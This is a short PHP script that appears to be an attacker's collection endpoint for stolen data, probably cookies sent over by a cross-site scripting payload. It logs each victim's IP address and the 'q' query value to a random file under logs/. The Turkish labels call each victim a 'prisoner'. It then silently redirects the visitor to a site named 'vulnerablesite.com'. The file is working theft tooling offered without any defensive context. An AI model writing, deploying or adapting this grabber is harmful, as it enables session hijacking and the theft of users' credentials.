    <?php
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $yenidosya = rand() . ".txt";
     $contents = "Yeni Mahkum Geldi\nMahkum IP: " . $ip . "\nMahkum Bilgi: " . $_GET["q"];

    $path = dirname(__FILE__) . "/logs/" . $yenidosya;
    $f = fopen($path, "x+");
    fwrite($f, $contents);
    fclose($f);
        


    header("Location: https://vulnerablesite.com/");
    exit();
    
    
?>
